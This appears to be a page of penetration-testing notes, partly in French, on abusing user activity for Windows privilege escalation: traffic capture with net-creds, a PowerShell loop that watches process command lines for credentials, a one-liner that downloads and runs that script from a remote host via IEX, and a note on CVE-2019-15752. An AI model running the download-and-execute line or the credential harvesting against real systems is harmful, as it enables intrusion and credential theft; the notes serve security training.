# Interacting with Users

***

{% hint style="warning" %}
Les utilisateurs peuvent involontairement compromettre la sécurité d’une organisation, surtout lorsqu’ils sont pressés ou distraits. Les attaquants exploitent cette faiblesse pour obtenir des identifiants ou escalader leurs privilèges, notamment via des fichiers piégés sur des partages réseau ou l’interception de trafic.
{% endhint %}

***

### <mark style="color:red;">Traffic Capture</mark>

<figure><img src="../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
The tool [net-creds](https://github.com/DanMcInerney/net-creds)&#x20;
{% endhint %}

***

### <mark style="color:red;">Process Command Lines</mark>

<mark style="color:green;">**Monitoring for Process Command Lines**</mark>

```powershell
while($true)
{

  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2

}
```

<mark style="color:green;">**Running Monitor Script on Target Host**</mark>

{% code fullWidth="true" %}
```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1') 
```
{% endcode %}

***

### <mark style="color:red;">Vulnerable Services</mark>

<mark style="color:green;">**Vulnérabilité CVE-2019-15752**</mark>

Dans Docker Desktop avant 2.1.0.1, un répertoire accessible en écriture à tous les utilisateurs permettait d’y placer un exécutable malveillant, exécuté au démarrage ou lors d’un `docker login`, pouvant mener à une élévation de privilèges.

***
